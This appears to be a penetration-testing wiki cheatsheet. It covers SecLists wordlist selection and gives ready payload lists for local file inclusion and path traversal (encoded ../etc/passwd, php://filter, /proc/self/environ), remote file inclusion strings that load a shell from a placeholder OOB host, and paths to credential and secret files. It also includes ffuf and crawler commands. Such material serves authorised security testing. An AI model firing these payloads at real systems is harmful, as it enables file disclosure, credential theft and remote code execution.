---
title: "Wordlists (SecLists Map + Custom Lists)"
type: cheatsheet
tags: [cheatsheet, wordlists, fuzzing, lfi, rfi, seclists]
date_created: 2026-06-16
date_updated: 2026-06-16
sources: []
---

# Wordlists

Where the fuzz lists live, ready custom lists, and how to build target-specific ones. Feed [[wiki/tools/ffuf]] / [[wiki/tools/nuclei]] ([[nuclei-arsenal]]) / gobuster.

## SecLists: selection (use wl-pick.sh - do not hand-pick)

`scripts/wl-pick.sh <surface> [fingerprint] [ctf|pt|bb]` deterministically prints the right
lists in size order + profile flags. The `fuzz` skill calls it. Reach for this before any
manual `ffuf -w`.

### The names lie about size - order by real line count
| list | lines |
|---|---|
| `common.txt` | 4.7k |
| `quickhits.txt` | ~2.5k |
| `raft-small-directories.txt` | 20k |
| `raft-medium-directories.txt` | 30k |
| `raft-large-directories.txt` | 62k |
| `DirBuster..2.3-small.txt` | 87k (bigger than raft-large!) |
| `DirBuster..2.3-medium.txt` | 220k (last resort / ctf only) |

Starting `directory-list-2.3-medium` first is the anti-pattern: 220k requests, WAF-tripping,
worst signal-per-request.

### Surface -> list
| surface | lists (run order) |
|---|---|
| content | `common` -> `quickhits` -> `raft-{small,medium,large}-directories` |
| files | `raft-{small,medium}-files` |
| vhost | `subdomains-top1million-{5000,20000,110000}`; `namelist` last |
| api | `api/api-endpoints` -> `api-seen-in-wild` -> `common-api-endpoints-mazen160` -> `api/objects` |
| params | `harness-params` -> `burp-parameter-names` |
| artifacts | `sensitive-artifacts` + `versioning_metafiles`, `Common-DB-Backups`, `UnixDotfiles.fuzz` |

### Fingerprint -> shipped list (T3 jump, no grinding)
| fingerprint | shipped list |
|---|---|
| Web server | `Web-Servers/{Apache-Tomcat,IIS,nginx,JBoss}.txt` |
| WordPress / Drupal / Joomla | `CMS/{wordpress.fuzz,Drupal}.txt`, `URLs/urls-*` |
| Sharepoint / AEM / Umbraco | `CMS/{Sharepoint,Adobe-AEM_2021,Umbraco}.txt` |
| Jenkins / WebLogic / Confluence / Keycloak | `Service-Specific/*.txt` |
| PHP / Spring / ColdFusion | `Programming-Language-Specific/*`, `coldfusion.txt` |

Extend the machine copy at `scripts/wordlist-map.json` (data, no code).

More: assetnote wordlists (`wordlists.assetnote.io`), `fuzzdb`, `payloadbox`, Kettle's `param-miner` lists.

## Custom: LFI / traversal (copy-paste)
```
/etc/passwd
../../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%afetc/passwd
/etc/passwd%00
php://filter/convert.base64-encode/resource=index.php
/proc/self/environ
/var/log/apache2/access.log
```
Generate traversal depth 1..12:
```bash
for i in $(seq 1 12); do printf '%0.s../' $(seq 1 $i); echo "etc/passwd"; done > lfi-depth.txt
```

## Custom: PHP wrappers
```
php://filter/convert.base64-encode/resource=
php://filter/read=string.rot13/resource=
php://input
data://text/plain;base64,
expect://
phar://
zip://
```

## Custom: RFI test
```
http://OOB/shell.txt
http://OOB/shell.txt%00
ftp://OOB/shell.txt
\\OOB\share\shell.php
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

## Custom: high-value files / endpoints
```
.env .git/config .git/HEAD .svn/entries .DS_Store
wp-config.php config.php settings.py application.properties appsettings.json
/actuator/env /actuator/heapdump /server-status /metrics /debug
/api/swagger.json /openapi.json /graphql /.well-known/security.txt
backup.zip db.sql dump.sql .bak .old ~
```

## Build target-specific lists (best hit rate)
```bash
# crawl the target's own words/paths/params
cewl -d 3 -m 5 https://target -w custom-words.txt
gau target.com | unfurl paths | sort -u > seen-paths.txt
gau target.com | unfurl keys | sort -u > seen-params.txt        # param names to fuzz
katana -u https://target -jc | grep -oP '\?\K[^=]+' | sort -u    # live params
# mutate: add extensions/backups
sed 's/$/.bak/;s/$/.old/;s/$/~/' seen-paths.txt >> fuzz.txt
```

## Use
```bash
ffuf -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'https://t/?page=FUZZ' -mr 'root:.*:0:0:'
ffuf -w raft-large-words.txt:FUZZ -u https://t/FUZZ -mc 200,403 -ac
```
See [[lfi-path-traversal]], [[recon-dorks]].
